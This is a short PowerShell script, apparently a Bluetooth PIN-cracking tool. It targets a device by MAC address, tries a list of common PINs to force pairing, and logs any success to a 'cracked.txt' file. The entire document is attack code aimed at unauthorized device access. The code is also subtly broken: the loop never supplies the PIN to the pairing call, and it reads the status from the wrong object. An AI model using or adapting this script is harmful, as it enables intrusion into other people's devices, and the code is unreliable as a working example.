param([string]$TargetMAC)
Add-Type -AssemblyName System.Runtime.WindowsRuntime

$commonPins = @("0000","1111","1234","4321","5555","9999","1004","5683")
$device = [Windows.Devices.Bluetooth.BluetoothDevice]::FromBluetoothAddressAsync([Convert]::ToUInt64($TargetMAC.Replace(':',''),16)).GetAwaiter().GetResult()

foreach ($pin in $commonPins) {
  try {
    $pairing = $device.DeviceInformation.Pairing.PairAsync()
    $pairing.GetAwaiter().GetResult()
    if ($pairing.Status -eq 'Completed') {
      echo "MAC: $TargetMAC | PIN: $pin" >> cracked.txt
      exit 0
    }
  } catch { continue }
  Start-Sleep -Milliseconds 300
}
exit 1
